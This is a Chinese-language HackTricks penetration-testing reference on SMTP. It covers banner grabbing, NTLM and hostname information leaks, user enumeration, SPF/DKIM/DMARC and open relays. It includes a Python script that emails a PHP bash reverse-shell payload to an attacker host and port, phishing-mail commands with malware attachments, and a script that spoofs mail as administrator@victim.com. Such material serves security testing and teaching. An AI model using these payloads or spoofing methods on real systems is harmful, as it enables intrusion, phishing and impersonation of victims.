# 25,465,587 - Pentesting SMTP/s

{{#include ../../banners/hacktricks-training.md}}

## **基本信息**

**简单邮件传输协议 (SMTP)** 是在 TCP/IP 套件中用于 **发送和接收电子邮件** 的协议。由于其在接收方排队消息的限制，SMTP 通常与 **POP3 或 IMAP** 一起使用。这些附加协议使用户能够将消息存储在服务器邮箱中并定期下载。

在实践中，**电子邮件程序** 通常使用 **SMTP 发送电子邮件**，而使用 **POP3 或 IMAP 接收** 它们。在基于 Unix 的系统中，**sendmail** 是最常用于电子邮件的 SMTP 服务器。商业软件包 Sendmail 包含一个 POP3 服务器。此外，**Microsoft Exchange** 提供一个 SMTP 服务器，并提供包括 POP3 支持的选项。

**默认端口：** 25,465(ssl),587(ssl)
```
PORT   STATE SERVICE REASON  VERSION
25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
```
### EMAIL Headers

如果你有机会**让受害者给你发送一封邮件**（例如通过网页的联系表单），请这样做，因为**你可以通过查看邮件的头部了解受害者的内部拓扑**。

你也可以从SMTP服务器获取一封邮件，尝试**向该服务器发送一封到不存在地址的邮件**（因为服务器会向攻击者发送一封NDN邮件）。但请确保你从一个允许的地址发送邮件（检查SPF策略），并且你可以接收NDN消息。

你还应该尝试**发送不同的内容，因为你可以在头部找到更有趣的信息**，例如：`X-Virus-Scanned: by av.domain.com`\
你应该发送EICAR测试文件。\
检测**AV**可能允许你利用**已知漏洞**。

## Basic actions

### **Banner Grabbing/Basic connection**

**SMTP:**
```bash
nc -vn <IP> 25
```
**SMTPS**:
```bash
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```
### 查找组织的 MX 服务器
```bash
dig +short mx google.com
```
### 枚举
```bash
nmap -p25 --script smtp-commands 10.10.10.10
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### NTLM Auth - 信息泄露

如果服务器支持 NTLM 认证（Windows），您可以获取敏感信息（版本）。更多信息 [**here**](https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666)。
```bash
root@kali: telnet example.com 587
220 example.com SMTP Server Banner
>> HELO
250 example.com Hello [x.x.x.x]
>> AUTH NTLM 334
NTLM supported
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```
或 **自动化** 这个与 **nmap** 插件 `smtp-ntlm-info.nse`

### 内部服务器名称 - 信息泄露

一些 SMTP 服务器在发出命令 "MAIL FROM" 而没有完整地址时，会自动补全发件人的地址，从而泄露其内部名称：
```
220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200
EHLO all
250-somedomain.com Hello [x.x.x.x]
250-TURN
250-SIZE 52428800
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
MAIL FROM: me
250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
```
### 嗅探

检查是否从发送到端口 25 的数据包中嗅探到一些密码

### [认证暴力破解](../../generic-hacking/brute-force.md#smtp)

## 用户名暴力破解枚举

**认证并不总是需要**

### RCPT TO
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
MAIL FROM:example@domain.com
250 2.1.0 example@domain.com... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```
### VRFY
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
VRFY root
250 Super-User root@myhost
VRFY blah
550 blah... User unknown
```
### EXPN
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 ed.williams@myhost
EXPN sshd
250 2.1.5 sshd privsep sshd@myhost
```
### 自动化工具
```
Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP>
Nmap: nmap --script smtp-enum-users <IP>
```
## DSN 报告

**投递状态通知报告**：如果您向一个组织发送电子邮件到一个**无效地址**，该组织将通过**邮件回复您**来通知该地址无效。返回邮件的**头部**将**包含**可能的**敏感信息**（如与报告交互的邮件服务的IP地址或防病毒软件信息）。

## [命令](smtp-commands.md)

### 从 Linux 控制台发送电子邮件
```bash
sendEmail -t to@domain.com -f from@attacker.com -s <ip smtp> -u "Important subject" -a /tmp/malware.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
- First line must be received within 60 seconds.
- End manual input with a CTRL-D on its own line.

<phishing message>
```

```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```
### 使用 Python 发送电子邮件

<details>

<summary>这里是 Python 代码</summary>
```python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = ""
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# payload
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
print("[-]Connection Error")
exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```
</details>

## SMTP Smuggling

SMTP Smuggling 漏洞允许绕过所有 SMTP 保护（有关保护的更多信息，请查看下一节）。有关 SMTP Smuggling 的更多信息，请查看：

{{#ref}}
smtp-smuggling.md
{{#endref}}

## 邮件伪造对策

通过采用 **SPF**、**DKIM** 和 **DMARC**，组织可以防止未经授权的电子邮件代表他们发送，因为伪造 SMTP 消息非常容易。

有关这些对策的 **完整指南** 可在 [https://seanthegeek.net/459/demystifying-dmarc/](https://seanthegeek.net/459/demystifying-dmarc/) 中找到。

### SPF

> [!CAUTION]
> SPF [在 2014 年被“弃用”](https://aws.amazon.com/premiumsupport/knowledge-center/route53-spf-record/)。这意味着您应该在 `domain.com` 中创建 **TXT 记录**，而不是在 `_spf.domain.com` 中，使用 **相同的语法**。\
> 此外，为了重用以前的 SPF 记录，通常会发现类似 `"v=spf1 include:_spf.google.com ~all"` 的内容。

**发送方策略框架**（SPF）是一种机制，使邮件传输代理（MTA）能够通过查询组织定义的授权邮件服务器列表来验证发送电子邮件的主机是否被授权。该列表指定了 **被授权代表域名发送电子邮件的 IP 地址/范围、域名和其他实体**，并在 SPF 记录中包含各种“**机制**”。

#### 机制

来自 [Wikipedia](https://en.wikipedia.org/wiki/Sender_Policy_Framework)：

| 机制      | 描述                                                                                                                                                                                                                                                                                                                         |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ALL       | 始终匹配；用于默认结果，如 `-all`，适用于未被先前机制匹配的所有 IP。                                                                                                                                                                                                                                  |
| A         | 如果域名有一个地址记录（A 或 AAAA），且可以解析为发送者的地址，则匹配。                                                                                                                                                                                                                   |
| IP4       | 如果发送者在给定的 IPv4 地址范围内，则匹配。                                                                                                                                                                                                                                                                              |
| IP6       | 如果发送者在给定的 IPv6 地址范围内，则匹配。                                                                                                                                                                                                                                                                              |
| MX        | 如果域名有一个 MX 记录解析为发送者的地址，则匹配（即邮件来自该域的一个入站邮件服务器）。                                                                                                                                                                          |
| PTR       | 如果客户端地址的域名（PTR 记录）在给定域中，并且该域名解析为客户端地址（前向确认反向 DNS），则匹配。此机制不推荐使用，尽可能避免。                                                                                     |
| EXISTS    | 如果给定的域名解析为任何地址，则匹配（无论解析为哪个地址）。这很少使用。与 SPF 宏语言一起，它提供了更复杂的匹配，如 DNSBL 查询。                                                                                                                           |
| INCLUDE   | 引用另一个域的策略。如果该域的策略通过，则此机制通过。然而，如果包含的策略失败，则继续处理。要完全委托给另一个域的策略，必须使用重定向扩展。                                                                                     |
| REDIRECT  | <p>重定向是指向另一个域名的指针，该域名托管 SPF 策略，它允许多个域共享相同的 SPF 策略。当处理大量共享相同电子邮件基础设施的域时，它非常有用。</p><p>将使用重定向机制中指示的域的 SPF 策略。</p> |

还可以识别 **限定符**，指示 **如果匹配了某个机制应该采取什么措施**。默认情况下，使用 **限定符 "+"**（因此如果匹配了任何机制，则表示允许）。\
您通常会在 **每个 SPF 策略的末尾**注意到类似：**\~all** 或 **-all**。这用于指示 **如果发送者不匹配任何 SPF 策略，则应将电子邮件标记为不可信（\~）或拒绝（-）该电子邮件。**

#### 限定符

策略中的每个机制可以由四个限定符之一前缀，以定义预期结果：

- **`+`**：对应于通过结果。默认情况下，机制假定此限定符，使得 `+mx` 等同于 `mx`。
- **`?`**：表示中立结果，类似于无（没有特定策略）。
- **`~`**：表示软失败，作为中立和失败之间的中间状态。符合此结果的电子邮件通常被接受，但会相应标记。
- **`-`**：表示失败，建议直接拒绝该电子邮件。

在即将到来的示例中，**google.com 的 SPF 策略**被说明。请注意在第一个 SPF 策略中包含来自不同域的 SPF 策略：
```shell-session
dig txt google.com | grep spf
google.com.             235     IN      TXT     "v=spf1 include:_spf.google.com ~all"

dig txt _spf.google.com | grep spf
; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com
;_spf.google.com.               IN      TXT
_spf.google.com.        235     IN      TXT     "v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all"

dig txt _netblocks.google.com | grep spf
_netblocks.google.com.  1606    IN      TXT     "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

dig txt _netblocks2.google.com | grep spf
_netblocks2.google.com. 1908    IN      TXT     "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"

dig txt _netblocks3.google.com | grep spf
_netblocks3.google.com. 1903    IN      TXT     "v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all"
```
传统上，可以伪造任何没有正确/任何 SPF 记录的域名。**如今**，如果 **电子邮件** 来自 **没有有效 SPF 记录的域名**，则可能会 **自动被拒绝/标记为不可信**。

要检查域的 SPF，您可以使用在线工具，例如：[https://www.kitterman.com/spf/validate.html](https://www.kitterman.com/spf/validate.html)

### DKIM (DomainKeys Identified Mail)

DKIM 用于签署外发电子邮件，允许外部邮件传输代理 (MTA) 通过从 DNS 检索域的公钥来验证它们。此公钥位于域的 TXT 记录中。要访问此密钥，必须知道选择器和域名。

例如，要请求密钥，域名和选择器是必需的。这些可以在邮件头 `DKIM-Signature` 中找到，例如 `d=gmail.com;s=20120113`。

获取此信息的命令可能如下所示：
```bash
dig 20120113._domainkey.gmail.com TXT | grep p=
# This command would return something like:
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
```
### DMARC (基于域的邮件认证、报告和一致性)

DMARC 通过建立在 SPF 和 DKIM 协议之上来增强电子邮件安全性。它概述了指导邮件服务器处理来自特定域的电子邮件的政策，包括如何处理认证失败以及将关于电子邮件处理操作的报告发送到哪里。

**要获取 DMARC 记录，您需要查询子域 \_dmarc**
```bash
# Reject
dig _dmarc.facebook.com txt | grep DMARC
_dmarc.facebook.com.	3600	IN	TXT	"v=DMARC1; p=reject; rua=mailto:a@dmarc.facebookmail.com; ruf=mailto:fb-dmarc@datafeeds.phishlabs.com; pct=100"

# Quarantine
dig _dmarc.google.com txt | grep DMARC
_dmarc.google.com.	300	IN	TXT	"v=DMARC1; p=quarantine; rua=mailto:mailauth-reports@google.com"

# None
dig _dmarc.bing.com txt | grep DMARC
_dmarc.bing.com.	3600	IN	TXT	"v=DMARC1; p=none; pct=100; rua=mailto:BingEmailDMARC@microsoft.com;"
```
#### DMARC 标签

| 标签名称 | 目的                                         | 示例                             |
| -------- | -------------------------------------------- | -------------------------------- |
| v        | 协议版本                                    | v=DMARC1                         |
| pct      | 受过滤消息的百分比                          | pct=20                           |
| ruf      | 取证报告的报告 URI                          | ruf=mailto:authfail@example.com  |
| rua      | 汇总报告的报告 URI                          | rua=mailto:aggrep@example.com    |
| p        | 组织域的策略                                | p=quarantine                     |
| sp       | OD 的子域策略                               | sp=reject                        |
| adkim    | DKIM 的对齐模式                             | adkim=s                          |
| aspf     | SPF 的对齐模式                              | aspf=r                           |

### **子域怎么办？**

**来自** [**这里**](https://serverfault.com/questions/322949/do-spf-records-for-primary-domain-apply-to-subdomains)**.**\
您需要为每个希望发送邮件的子域拥有单独的 SPF 记录。\
以下内容最初发布在 openspf.org 上，该网站曾是此类信息的极好资源。

> 恶魔问题：子域怎么办？
>
> 如果我从 pielovers.demon.co.uk 收到邮件，而 pielovers 没有 SPF 数据，我应该回退一级并测试 demon.co.uk 的 SPF 吗？不应该。Demon 的每个子域都是不同的客户，每个客户可能有自己的政策。Demon 的政策默认适用于所有客户是没有意义的；如果 Demon 想这样做，可以为每个子域设置 SPF 记录。
>
> 因此，给 SPF 发布者的建议是：您应该为每个具有 A 或 MX 记录的子域或主机名添加 SPF 记录。
>
> 具有通配符 A 或 MX 记录的网站也应该具有通配符 SPF 记录，形式为：\* IN TXT "v=spf1 -all"

这很有道理 - 子域可能位于不同的地理位置，并且具有非常不同的 SPF 定义。

### **开放转发**

发送电子邮件时，确保它们不会被标记为垃圾邮件至关重要。这通常通过使用**受收件人信任的中继服务器**来实现。然而，一个常见的挑战是管理员可能并不完全了解哪些**IP 范围是安全的**。这种缺乏理解可能导致在设置 SMTP 服务器时出现错误，这是安全评估中经常识别的风险。

一些管理员使用的解决方法是为了避免电子邮件投递问题，特别是与潜在或正在进行的客户的通信，**允许来自任何 IP 地址的连接**。这是通过将 SMTP 服务器的 `mynetworks` 参数配置为接受所有 IP 地址来实现的，如下所示：
```bash
mynetworks = 0.0.0.0/0
```
要检查邮件服务器是否为开放转发（这意味着它可以从任何外部来源转发电子邮件），通常使用 `nmap` 工具。它包括一个专门用于测试的脚本。使用 `nmap` 在端口 25 上对服务器（例如，IP 为 10.10.10.10）进行详细扫描的命令是：
```bash
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### **工具**

- [**https://github.com/serain/mailspoof**](https://github.com/serain/mailspoof) **检查 SPF 和 DMARC 配置错误**
- [**https://pypi.org/project/checkdmarc/**](https://pypi.org/project/checkdmarc/) **自动获取 SPF 和 DMARC 配置**

### 发送伪造邮件

- [**https://www.mailsploit.com/index**](https://www.mailsploit.com/index)
- [**http://www.anonymailer.net/**](http://www.anonymailer.net)
- [**https://emkei.cz/**](https://emkei.cz/)

**或者你可以使用一个工具：**

- [**https://github.com/magichk/magicspoofing**](https://github.com/magichk/magicspoofing)
```bash
# This will send a test email from test@victim.com to destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
# But you can also modify more options of the email
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
```
> [!WARNING]
> 如果您在使用 dkim python lib 解析密钥时遇到任何 **错误**，请随意使用以下内容。\
> **注意**：这只是一个临时修复，用于在某些情况下 openssl 私钥 **无法被 dkim 解析** 时进行快速检查。
>
> ```
> -----BEGIN RSA PRIVATE KEY-----
> MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt
> spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO
> pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB
> AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1
> koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR
> fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq
> 1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j
> ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc
> GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf
> 422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI
> Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do
> zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP
> K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==
> -----END RSA PRIVATE KEY-----
> ```

**或者您可以手动执行：**

{{#tabs}}
{{#tab name="PHP"}}

<pre class="language-php"><code class="lang-php"><strong># 这将发送一条未签名的消息
</strong><strong>mail("your_email@gmail.com", "Test Subject!", "hey! This is a test", "From: administrator@victim.com");
</strong></code></pre>

{{#endtab}}

{{#tab name="Python"}}
```python
# Code from https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py

import os
import dkim #pip3 install dkimpy
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# Set params
destination="destination@gmail.com"
sender="administrator@victim.com"
subject="Test"
message_html="""
<html>
<body>
<h3>This is a test, not a scam</h3>
<br />
</body>
</html>
"""
sender_domain=sender.split("@")[1]

# Prepare postfix
os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = "+sender_domain+"/g' /etc/postfix/main.cf")
os.system("systemctl restart postfix")

# Generate DKIM keys
dkim_private_key_path="dkimprivatekey.pem"
os.system(f"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null")
with open(dkim_private_key_path) as fh:
dkim_private_key = fh.read()

# Generate email
msg = MIMEMultipart("alternative")
msg.attach(MIMEText(message_html, "html"))
msg["To"] = destination
msg["From"] = sender
msg["Subject"] = subject
headers = [b"To", b"From", b"Subject"]
msg_data = msg.as_bytes()

# Sign email with dkim
## The receiver won't be able to check it, but the email will appear as signed (and therefore, more trusted)
dkim_selector="s1"
sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
msg["DKIM-Signature"] = sig[len("DKIM-Signature: ") :].decode()
msg_data = msg.as_bytes()

# Use local postfix relay to send email
smtp="127.0.0.1"
s = smtplib.SMTP(smtp)
s.sendmail(sender, [destination], msg_data)
```
{{#endtab}}
{{#endtabs}}

### **更多信息**

**在** [**https://seanthegeek.net/459/demystifying-dmarc/**](https://seanthegeek.net/459/demystifying-dmarc/) **中找到有关这些保护的更多信息**

### **其他钓鱼指标**

- 域名的年龄
- 指向IP地址的链接
- 链接操控技术
- 可疑（不常见）附件
- 损坏的电子邮件内容
- 使用的值与邮件头不同
- 存在有效且受信任的SSL证书
- 将页面提交到网络内容过滤网站

## 通过SMTP进行数据外泄

**如果您可以通过SMTP发送数据** [**请阅读此文**](../../generic-hacking/exfiltration.md#smtp)**。**

## 配置文件

### Postfix

通常，如果已安装，`/etc/postfix/master.cf` 中包含 **在用户接收新邮件时执行的脚本**。例如，行 `flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}` 意味着如果用户mark接收到新邮件，将执行 `/etc/postfix/filtering`。

其他配置文件：
```
sendmail.cf
submit.cf
```
## 参考

- [https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/](https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/)
- [https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/](https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/)

## HackTricks 自动命令
```
Protocol_Name: SMTP    #Protocol Abbreviation if there is one.
Port_Number:  25,465,587     #Comma separated if there is more than one.
Protocol_Description: Simple Mail Transfer Protocol          #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMTP
Note: |
SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.

https://book.hacktricks.xyz/pentesting/pentesting-smtp

Entry_2:
Name: Banner Grab
Description: Grab SMTP Banner
Command: nc -vn {IP} 25

Entry_3:
Name: SMTP Vuln Scan
Description: SMTP Vuln Scan With Nmap
Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}

Entry_4:
Name: SMTP User Enum
Description: Enumerate uses with smtp-user-enum
Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}

Entry_5:
Name: SMTPS Connect
Description: Attempt to connect to SMTPS two different ways
Command: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587

Entry_6:
Name: Find MX Servers
Description: Find MX servers of an organization
Command: dig +short mx {Domain_Name}

Entry_7:
Name: Hydra Brute Force
Description: Need Nothing
Command: hydra -P {Big_Passwordlist} {IP} smtp -V

Entry_8:
Name: consolesless mfs enumeration
Description: SMTP enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'

```
{{#include ../../banners/hacktricks-training.md}}
